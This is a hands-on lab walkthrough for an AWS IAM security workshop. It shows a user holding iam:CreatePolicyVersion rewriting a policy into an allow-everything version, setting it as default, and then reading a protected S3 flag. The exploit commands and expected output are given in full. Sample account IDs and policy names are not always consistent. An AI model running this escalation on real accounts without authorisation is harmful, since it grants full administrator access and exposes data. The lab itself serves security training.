# Lab 2: CreatePolicyVersion — Self-Escalation via Policy Version Manipulation

## Scenario 1: CreatePolicyVersion — Self-Escalation via Policy Version Manipulation

**Category:** Self-Escalation
**Starting Identity:** `iamws-policy-developer-user`
**Target:** Crown jewels in `s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt`

**The Vulnerability:** `iamws-policy-developer-user` can create new versions of IAM policies — meaning they can update the `iamws-developer-tools-policy`, which is attached to their own user. By creating a new version with administrator permissions and setting it as default, they grant themselves full adminstrator access without touching any other principal or resource.

**Real-world scenario:** 
- Larger orgs often delegate IAM policy management to non-admins — platform engineers, senior developers, policy owners — so the central security team isn't a bottleneck. 
- When an AWS user or role has the `iam:CreatePolicyVersion` permission attached, they can grant new permissions to other IAM entities as determined by the `Resource` clause. 
- For example, if a policy grants `iam:CreatePolicyVersion` with `Resource: "*"` (a common scenario because scoping resources included in the policy is often difficult and/or tedious), any user with that policy attached can update any existing policy to add new permissions, including policies attached to their own user. 
- Creating a new version of their own attached policy that allows `*:*` turns delegated policy management into account admin in a single API call.

### A note on the identities you'll switch between

This lab uses two AWS identities. Keep this straight as you go (see Lab 1 for the full roster):

| Identity | What it is | When you use it |
| --- | --- | --- |
| `iamws-policy-developer-user` | The attacker. A policy developer who can rewrite the policy attached to their own user. | Part C: the whole exploit |
| `iamws-scanner-user` | A least-privilege, read-only identity for recon. | Part A: setting `ACCOUNT_ID` and running recon queries |

There is no separate defense identity in this lab — you'll remediate this same scenario as an admin in Lab 4.

### Part A: Identify with iam-recon

You already built the iam-recon graph during [Lab 1: Lab Setup](../lab-1-setup/README.md) (Step 8), so every query in this section runs offline against the cached data — no rescan needed. If `ACCOUNT_ID` is not set in your current shell, set it again:

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text --profile iamws-scanner-user)
```

Scope the pathfinding scan to this scenario's principal — no need to scroll through every match in the account-wide view from setup:

```bash
iam-recon --account $ACCOUNT_ID pathfinding --principal user/iamws-policy-developer-user
```

Expected output:

```
Pathfinding.cloud
  Database: N known escalation paths bundled

  user/iamws-policy-developer-user — 1 paths matched:

  [iam-001] CreatePolicyVersion (self-escalation)
    Permissions: iam:CreatePolicyVersion
    https://www.pathfinding.cloud/paths/iam-001
```

pathfinding.cloud path `iam-001` is the canonical write-up for this attack family. That entry is iam-recon telling you: "this user has every permission required to execute the `iam-001` self-escalation path."

Confirm the specific permission directly:

```bash
iam-recon --account $ACCOUNT_ID argquery \
  --principal user/iamws-policy-developer-user \
  --action iam:CreatePolicyVersion
```

Expected output:

```
ALLOW user/iamws-policy-developer-user can call iam:CreatePolicyVersion with *
```

**In the interactive visualization:** launch `iam-recon --account $ACCOUNT_ID visualize --interactive-viz` (the port is dynamic — copy the `http://127.0.0.1:<port>` URL iam-recon prints). The `iamws-policy-developer-user` node is blue: iam-recon has no graph-edge checker for `iam:CreatePolicyVersion`, so this attack is only surfaced by the `pathfinding` command, not by the colored edges in the viz. Clicking the node still shows the pathfinding annotation — this is a good example of digging deeper when the viz color alone doesn't tell the full story.

### Part B: Understand the Attack

Visit [pathfinding.cloud/paths/iam-001](https://pathfinding.cloud/paths/iam-001):

- **Category:** Self-Escalation
- **Required permission:** `iam:CreatePolicyVersion`
- **Attack:** Create a new policy version with admin permissions and set it as default
- **Impact:** Immediate full account access

### Part C: Exploit the Vulnerability

**Step 1: Confirm your low-privilege identity**

```bash
aws sts get-caller-identity --profile iamws-policy-developer-user
```

Expected output:
```json
{
    "UserId": "AIDAXXXXXXXXXXXXXXXXX",
    "Account": "767397689800",
    "Arn": "arn:aws:iam::767397689800:user/iamws-policy-developer-user"
}
```

**Step 2: Try to access the crown jewels in S3 — your API call will be denied**

```bash
aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
  --profile iamws-policy-developer-user
```

Expected output:
```
fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
```

**Step 3: Inspect the policies attached to the `iamws-policy-developer-user` user**

```bash
aws iam list-attached-user-policies --user-name iamws-policy-developer-user
```

Expected output:
```
{
    "AttachedPolicies": [
        {
            "PolicyName": "iamws-policy-developer-policy",
            "PolicyArn": "arn:aws:iam::652026215310:policy/iamws-policy-developer-policy"
        },
        {
            "PolicyName": "iamws-developer-tools-policy",
            "PolicyArn": "arn:aws:iam::652026215310:policy/iamws-developer-tools-policy"
        }
    ]
}
```

The `iamws-policy-developer-user` user has two IAM policies attached: `iamws-policy-developer-policy` and `iamws-developer-tools-policy`. Inspect both policies.


```bash
POLICY_ARN="arn:aws:iam::${ACCOUNT_ID}:policy/iamws-developer-tools-policy"

aws iam get-policy-version \
  --policy-arn $POLICY_ARN --version-id v1 \
  --query 'PolicyVersion.Document' --output json \
  --profile iamws-policy-developer-user
```

Expected output:

```
{
    "Statement": [
        {
            "Action": [
                "ec2:DescribeInstances"
            ],
            "Effect": "Allow",
            "Resource": "*",
            "Sid": "AllowDeveloperTools"
        }
    ],
    "Version": "2012-10-17"
}
```

The `iamws-developer-tools-policy` policy grants EC2 read-only access to your `iamws-policy-developer-user` user. This is a fairly minimal policy.

```bash
POLICY_ARN="arn:aws:iam::${ACCOUNT_ID}:policy/iamws-policy-developer-policy"

aws iam get-policy-version \
  --policy-arn $POLICY_ARN --version-id v1 \
  --query 'PolicyVersion.Document' --output json \
  --profile iamws-policy-developer-user
```

Expected output:
```
{
    "Statement": [
        {
            "Action": [
                "iam:CreatePolicyVersion",
                "iam:ListPolicyVersions",
                "iam:GetPolicy",
                "iam:GetPolicyVersion",
                "iam:SetDefaultPolicyVersion"
            ],
            "Effect": "Allow",
            "Resource": "*",
            "Sid": "AllowPolicyVersionManagement"
        }
    ],
    "Version": "2012-10-17"
}
```

The `iamws-developer-policy` policy however, grants `iam:CreatePolicyVersion` and  `iam:SetDefaultPolicyVersion`. This creates the priviledge escalation path.

**Step 4: Create a new version of the policy with admin permissions, and set it as default**

```bash
aws iam create-policy-version \
  --policy-arn $POLICY_ARN \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default \
  --profile iamws-policy-developer-user
```

Example output:
```
{
    "PolicyVersion": {
        "VersionId": "v2",
        "IsDefaultVersion": true,
        "CreateDate": "2026-10-06T20:17:23+00:00"
    }
}
```

No error — the user is allowed to create new policy versions, including ones that grant `*:*` - allowing all actions on all resources. 

**Step 5: Claim the crown jewels**

> [!NOTE]
> IAM policy changes are eventually consistent — the new version can take 5–15 seconds to propagate. If the command below returns 403, wait and retry.

```bash
aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
  --profile iamws-policy-developer-user
```

The file contents appear — you escalated from developer to effective `AdministratorAccess` by modifying your own policy.